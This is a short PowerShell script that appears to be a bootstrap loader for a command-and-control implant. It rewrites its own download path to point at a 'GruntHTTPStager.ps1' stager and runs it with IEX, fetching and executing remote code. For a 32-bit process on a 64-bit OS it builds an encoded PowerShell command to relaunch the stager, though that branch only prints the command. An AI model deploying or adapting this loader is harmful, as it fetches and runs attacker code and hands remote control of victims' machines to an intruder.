$EGG="/bs.ps1"
$HUNT="/GruntHTTPStager.ps1"

$URL=$MyInvocation.MyCommand -Replace $EGG, $HUNT


if (-not $([Environment]::Is64BitProcess) -and $([Environment]::Is64BitOperatingSystem)){
    # Not running as 64 bit process but is running on a 64 bit OS, Upgrade via sysnative
    #Write-Output("Upgrade's due")
	$ps64 = (join-path -Path ($pshome -replace "syswow64", "sysnative") -ChildPath "powershell.exe")
    $ENCODED=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($URL))
    Write-Output('Start-Process -FilePath $ps64 -ArgumentList "-enc $ENCODED"')

} else {
    # Either Running 32bit on 32bit, or running as 64 on 64; either way can use system32 and just IEX away!
    #Write-Output("looking fine...")
    IEX ${URL}
}

